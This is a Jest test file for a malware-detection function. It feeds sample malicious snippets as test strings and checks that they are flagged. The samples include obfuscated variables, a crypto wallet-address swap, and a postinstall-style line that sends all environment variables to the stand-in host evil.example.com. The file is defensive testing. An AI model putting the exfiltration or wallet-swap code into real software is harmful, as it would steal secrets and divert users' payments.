/**
 * Threat Detection Tests
 * Migrated from test/unit/threat-detection.test.js to TypeScript
 */

import { describe, it, expect } from '@jest/globals';
import { detectMalware } from '../../src/lib/detection';

describe('Threat Detection', () => {
  describe('obfuscated variable names', () => {
    it('detects obfuscated hex-mangled variable names', () => {
      const maliciousContent = `
        var _0x112fa8 = ['aGVsbG8=', 'bWFsaWNpb3Vz'];
        var _0x180f = function(_0x112fa8, _0xabc) { return _0x112fa8[_0xabc]; };
      `;

      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some((t) => t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE')
      ).toBe(true);
    });

    it('does not flag clean, readable code', () => {
      const cleanContent = `
        function calculateTotal(items) {
          return items.reduce((sum, item) => sum + item.price, 0);
        }
      `;
      const result = detectMalware(cleanContent);
      expect(Array.isArray(result)).toBe(true);
      const highSeverity = result.filter(
        (t) => t.severity === 'HIGH' || t.severity === 'CRITICAL'
      );
      expect(highSeverity).toHaveLength(0);
    });
  });

  describe('wallet hijacking patterns', () => {
    it('detects ethereum wallet address replacement', () => {
      const maliciousContent = `
        function sendPayment(amount) {
          const walletAddress = '0xABC123DEF456789012345678901234567890ABCD';
          if (process.env.NODE_ENV !== 'test') {
            walletAddress = '0xdeadbeef1234567890abcdef1234567890abcdef';
          }
          transfer(walletAddress, amount);
        }
      `;
      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
    });
  });

  describe('postinstall malware patterns', () => {
    it('detects suspicious network exfiltration in postinstall', () => {
      const maliciousContent = `
        const https = require('https');
        https.get('https://evil.example.com/collect?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
      `;
      const result = detectMalware(maliciousContent, 'postinstall.js');
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
    });
  });

  describe('massive hex array (known obfuscation pattern)', () => {
    it('detects a large hex-array obfuscation blob', () => {
      // Pattern: /\[(0x[0-9a-fA-F]+,\s*){3,}/g  — numeric hex literals in an array
      const hexArray = `var _a = [${Array.from({ length: 50 }, (_, i) => `0x${i.toString(16).padStart(4, '0')}`).join(', ')}];`;
      const result = detectMalware(hexArray);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some((t) => t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE')
      ).toBe(true);
    });
  });
});
